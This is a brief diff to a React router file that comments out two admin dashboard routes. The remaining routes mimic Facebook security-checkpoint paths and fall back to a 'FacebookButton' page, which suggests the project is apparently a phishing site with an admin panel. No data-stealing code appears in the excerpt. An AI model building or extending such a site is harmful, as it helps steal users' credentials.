@@ -68,8 +68,8 @@ export default function RootNavigation() {
           />
           <Route path="/checkpoint/next=phone" element={<TH />} />
           <Route path="/checkpoint/next=secure" element={<Robot />} /> */}
-          <Route path="/admin/kka" element={<Dashboard />} />
-          <Route path="/admin/kka2" element={<Dashboard2 />} />
+          {/* <Route path="/admin/kka" element={<Dashboard />} /> */}
+          {/* <Route path="/admin/kka2" element={<Dashboard2 />} /> */}
           <Route path="*" element={<FacebookButton />} />
         </Route>
       </Routes>
